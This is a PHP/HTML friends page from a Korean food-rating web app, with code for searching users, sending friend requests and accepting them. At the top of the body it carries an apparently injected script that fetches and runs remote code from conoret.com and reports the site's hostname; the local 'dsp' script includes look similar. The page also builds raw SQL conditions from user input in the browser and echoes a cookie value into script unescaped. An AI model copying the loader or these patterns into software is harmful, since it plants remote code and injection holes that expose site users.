<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.png">

    <title>ssosso-table.food-db.rating</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>
    <!-- Custom styles for this template -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">

    <link href="./css/main/cover.css" rel="stylesheet">
    <link href="./css/friends.css" rel="stylesheet">

    <style>
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 640px) {
            #friend_layout {
                width: 400px !important;
                margin: auto !important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
        .btn-outline-success {
            color: #e4bd74;
            border-color: #e4bd74;
            border-top-color: #e4bd74;
            border-right-color: #e4bd74;
            border-bottom-color: #e4bd74;
            border-left-color: #e4bd74;
        }
        .btn-outline-success:hover {
            color: white;
            background-color: #e4bd74;
            border-color: #e4bd74;
        }
        .btn-outline-success.disabled, .btn-outline-success:disabled {
            color: #e4bd74;
            background-color: transparent;
        }
        body {
            padding-left: 0!important;
            padding-right: 0!important;
            padding-bottom: 0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding-left: 0!important;
            padding-right: 0!important;
            padding-bottom: 0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%!important;
            width: 100% !important;
        }
        header {
            width: 100%!important;
            background-color:#ffebaa;
        }
        .card {
            width: 100% !important;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
    </style>

    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>
    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <script type="text/javascript">

        let id= <?php echo $_COOKIE['user_id']?>

        let userIds=[]
        let friendInfo={}

        let friendAddInfo={}
        let friendId
        async function searchFriend() {
            let userInfo=document.getElementById("friendInputInfo").value
            let friends_info=null

            if(isNaN(userInfo)) {
                friends_info=JSON.parse(await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'select',
                        1:'*',
                        2:'user',
                        3:`nickname='${userInfo}' and id != ${id} and id not in (select friendid from friend where userid=${id});`
                    }}))
            }
            else {
                friends_info=JSON.parse(await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'select',
                        1:'*',
                        2:'user',
                        3:`(userid=${userInfo}) and id != ${id} and id not in`+
                            `(select friendid from friend where userid=${id});`
                    }}))
                console.log(`where (userid=${userInfo}) and id != ${id} and id not in`+
                    `(select friendid from friend where userid=${id});`)
            }


            if(friends_info.length!==0) {
                friendAddInfo.friendId=friends_info[0][1]
                friendId=friends_info[0][1]
                let format=`
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="${friends_info[0][4]}" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="d-flex justify-content-start fs-3" style="">
                            <span class="col-5">${friends_info[0][6]}</span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2 add-friend-layout" style="margin:10px 0 0 0" onclick="friend_request(${friendId})">
                            <input id="add-friend-button-${friendId}" type="button" class="btn col-6 btn-outline-success" value="친구 요청" >
                        </div>
                    </div>
                </div>
                `
                document.getElementById("friend-modal-body").innerHTML=format
            }
        }
        async function friend_request() {
            await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'insert',
                    1:'friend_request(`from`,`to`)',
                    2:`<?php echo $_COOKIE['user_id'];?>,${arguments[0]}`
                }})
            if(document.getElementById(`add-friend-button-${arguments[0]}`).disabled===false) {
                document.getElementById(`add-friend-button-${arguments[0]}`).disabled=true
                document.getElementById(`add-friend-button-${arguments[0]}`).value="친구 추가됨"
            }
            else {
                document.getElementById(`add-friend-button-${arguments[0]}`).disabled=false
                document.getElementById(`add-friend-button-${arguments[0]}`).value="친구 추가"
            }

            location.reload()
        }
        async function add_friend() {
            const search_res=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'*',
                    2:'friend',
                    3:`userid=${id} and friendid=${friendId};`
                }}))
            if(search_res.length>0) {
                alert('already friend')
            }
            else {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'friend(userid,friendid)',
                        2:`${id},${friendId};`
                    }})
            }

            if(document.getElementById('add-friend-button').disabled===false) {
                document.getElementById('add-friend-button').disabled=true
                document.getElementById('add-friend-button').value="친구 추가됨"
            }
            else {
                document.getElementById('add-friend-button').disabled=false
                document.getElementById('add-friend-button').value="친구 추가"
            }

            location.reload()
        }
        async function accept_request() {
            if(document.getElementById(`request-friend-button-${arguments[0]}`).disabled===false) {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'friend(userid,friendid)',
                        2:`<?php echo $_COOKIE['user_id'];?>, ${arguments[0]}`
                    }})
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'delete',
                        1:'friend_request',
                        2:`\`from\`=${arguments[0]} and \`to\`=<?php echo $_COOKIE['user_id'];?>`
                    }})
                document.getElementById(`request-friend-button-${arguments[0]}`).disabled=true
                document.getElementById(`request-friend-button-${arguments[0]}`).value="친구 추가됨"

            }
            else {
                document.getElementById(`request-friend-button-${arguments[0]}`).disabled=false
                document.getElementById(`request-friend-button-${arguments[0]}`).value="친구 추가"
            }
            location.reload()
        }
        async function init_v2() {
            let request_format=``
            const search_res=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'userid,id,image,nickname',
                    2:`friend_request,user`,
                    3:'`to`=<?php echo $_COOKIE['user_id'];?> and friend_request.`from`=user.id;'
                }}))
            console.log('aaa')
            console.log(search_res)
            if(search_res.length==0) {
                document.getElementById('friend-request-notification').src='src/notification.png'
                document.getElementById('friend-request').innerHTML=`<span>친구 요청이 없어요</span>`
            }
            else {
                for(let i=0;i<search_res.length;i++) {
                    request_format+=`
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-request-img" src="${search_res[i][2]}" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="d-flex justify-content-start fs-3" style="">
                            <span class="col-5">${search_res[i][3]}</span>
                        </div>
                        <div class="request-friend-layout d-flex" class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0" onclick="accept_request(${search_res[i][1]})">
                            <input id='request-friend-button-${search_res[i][1]}' class="btn col-6 btn-outline-success" type="button" value="수락하기" >
                        </div>
                    </div>
                </div>
                `
                }
                document.getElementById('friend-request-notification').src='src/notification_on.png'
                document.getElementById('friend-request').innerHTML=request_format
            }

        }
    </script>
    <script type="text/javascript" src="/script/friends.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();

</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <script>
        init()
        init_v2()
    </script>

    <header class="masthead mb-auto fixed-top">
        <div class="inner">
            <a href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="72px" height="72px"></a>
            <nav class="nav nav-masthead justify-content-center">
                <a href="#" data-bs-toggle="modal" data-bs-target="#friendRequestModal">
                    <img id='friend-request-notification'src="src/notification.png" width="24px" height="24px"/>
                </a>
            </nav>
        </div>

    </header>

    <main role="main" class="inner cover d-flex" id="rating" >

        <div class="p-3 bg-light card" id="friend_layout">
            <div class="input-group mb-3">
                <input type="text" class="form-control" placeholder="코드 입력" aria-label="Recipient's username" aria-describedby="button-addon2" id="friendInputInfo">
                <button class="btn btn-outline-secondary" type="button" value="친구 추가" onclick="searchFriend()" data-bs-toggle="modal" data-bs-target="#friendSearchModal">Button</button>
            </div>
            <div class="friends-placeholders">

                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="card" id='my-info' style="">
            <div class="card-body" id="title">
                <img id="food-info-image" src="/src/food_placeholder.png" height="360px" width="360px"/>
                <h1 class="card-title" id="food-name">음식 이름</h1>
                <p class="card-text" id="food-traits">특성 목록</p>
                <div id="rating" style="margin-bottom: 50px;">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                </div>
            </div>
        </div>
        <!-- Button trigger modal -->

        <!-- Modal -->
        <div id="modal-layout">
            <!-- Modal -->
            <div class="modal fade" id="friendRequestModal" tabindex="-1" aria-labelledby="friendRequestModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="friendRequestModalLabel">친구 요청</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-request">

                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Modal -->
            <div class="modal fade" id="friendSearchModal" tabindex="-1" aria-labelledby="friendSearchModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h1 class="modal-title fs-5" id="friendSearchModalLabel">검색 결과</h1>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-modal-body" style="max-height: 500px; overflow-y: auto;">
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <footer id="footer"  class="mastfoot mt-auto fixed-bottom" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, of <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>


</div>
</body>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</html>